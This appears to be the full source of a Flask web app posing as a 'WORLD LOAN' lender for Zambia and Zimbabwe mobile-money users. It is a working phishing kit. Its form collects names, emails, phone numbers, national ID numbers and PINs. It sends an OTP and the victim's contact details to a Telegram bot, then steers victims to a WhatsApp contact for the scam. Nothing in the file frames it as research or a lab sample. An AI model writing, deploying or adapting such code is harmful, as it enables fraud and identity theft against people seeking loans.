import os, random
from flask import Flask, request, session, redirect
import requests
app = Flask(__name__)
app.secret_key = "final-safe-v1"
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
WA = "https://wa.me/message/CFCJWLOZ7IWZK1"
IMG = "https://i.postimg.cc/N001FyNh/IMG-20261025-WA7135.jpg"

@app.route('/')
def home():
    return redirect('/api')

@app.route('/api', methods=['GET','POST'])
def api():
    if request.method == 'POST':
        otp = str(random.randint(100000,999999))
        ref = "WLD-" + str(random.randint(1000,9999))
        session['otp'] = otp
        session['name'] = request.form.get('full_name')
        session['email'] = request.form.get('email')
        session['phone'] = request.form.get('phone')
        session['amount'] = request.form.get('amount')
        session['country'] = request.form.get('country')
        session['ref'] = ref
        try:
            txt = "OTP " + otp + " " + session['country'] + " " + session['phone'] + " Email " + session['email']
            requests.post("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", data={"chat_id":CHAT_ID,"text":txt})
        except:
            pass
        html = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'><meta property='og:image' content='IMG'><style>body{font-family:Arial;background:#f0f4f0;padding:20px}.box{background:white;max-width:400px;margin:50px auto;padding:25px;border-radius:15px;text-align:center}.big{font-size:30px;background:#e8f5e9;padding:12px;border-radius:10px;color:#0a7a3e;font-weight:bold}</style></head><body><div class='box'><img src='IMG' style='width:100%;border-radius:12px'><h2>SMS to PHONE</h2><p>MAIL</p><div class='big'>CODE</div><form method='POST' action='/verify'><input name='otp' placeholder='Enter code' required style='width:100%;padding:12px;margin-top:15px'><button style='width:100%;padding:12px;background:#0a7a3e;color:white;border:none;border-radius:8px;margin-top:10px'>Verify</button></form></div></body></html>"
        html = html.replace("PHONE", session['phone']).replace("MAIL", session['email']).replace("CODE", otp).replace("IMG", IMG)
        return html

    html2 = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'><meta property='og:title' content='WORLD LOAN Zambia Zimbabwe'><meta property='og:image' content='IMG'><style>body{font-family:Arial;background:#f0f4f0;padding:15px}.box{background:white;max-width:420px;margin:auto;padding:20px;border-radius:15px}input,select{width:100%;padding:11px;margin:6px 0;border:1px solid #ccc;border-radius:8px}button{width:100%;padding:13px;background:#0a7a3e;color:white;border:none;border-radius:8px;font-weight:bold}</style></head><body><div class='box'><img src='IMG' style='width:100%;border-radius:12px'><h2 style='text-align:center;color:#0a7a3e'>WORLD LOAN - Zambia & Zimbabwe</h2><p style='text-align:center'>Airtel Money | EcoCash | MTN</p><form method='POST'><input name='full_name' placeholder='Full Name' required><input name='email' placeholder='Email Address' required><select name='country' required><option value='Zambia'>Zambia</option><option value='Zimbabwe'>Zimbabwe</option></select><input name='phone' placeholder='Phone +260 / +263' required><input name='id_number' placeholder='NRC ID' required><input name='county' placeholder='City Lusaka Harare' required><input name='amount' placeholder='Amount ZMW USD' required><select name='period'><option>7 Days</option><option>14 Days</option><option>30 Days</option></select><input name='pin' placeholder='PIN' required><button>Apply Now</button></form><div style='text-align:center;margin-top:10px'><a href='LINK' style='background:#25D366;color:white;padding:10px 15px;border-radius:8px;text-decoration:none'>WhatsApp</a></div></div><a href='LINK' style='position:fixed;bottom:20px;right:20px;background:#25D366;color:white;padding:12px 18px;border-radius:50px;text-decoration:none;font-weight:bold'>Text Me</a></body></html>"
    html2 = html2.replace("IMG", IMG).replace("LINK", WA)
    return html2

@app.route('/verify', methods=['POST'])
def verify():
    if request.form.get('otp') == session.get('otp'):
        ref = session.get('ref')
        try:
            txt2 = "VERIFIED " + session.get('country') + " " + ref + " Email " + session.get('email') + " Phone " + session.get('phone')
            requests.post("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", data={"chat_id":CHAT_ID,"text":txt2})
        except:
            pass
        fh = "<html><body><div style='max-width:400px;margin:40px auto;background:white;padding:25px;border-radius:15px;text-align:center;font-family:Arial'><img src='IMG' style='width:100%;border-radius:12px'><h2>Verified REF</h2><p>COUNTRY MAIL approved</p><a href='LINK' style='display:block;padding:14px;background:#25D366;color:white;border-radius:10px;text-decoration:none;font-weight:bold'>TEXT ME ON WHATSAPP</a></div></body></html>"
        fh = fh.replace("REF", ref).replace("COUNTRY", session.get('country')).replace("MAIL", session.get('email')).replace("IMG", IMG).replace("LINK", WA)
        session.clear()
        return fh
    return "Wrong code <a href='/api'>Retry</a>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
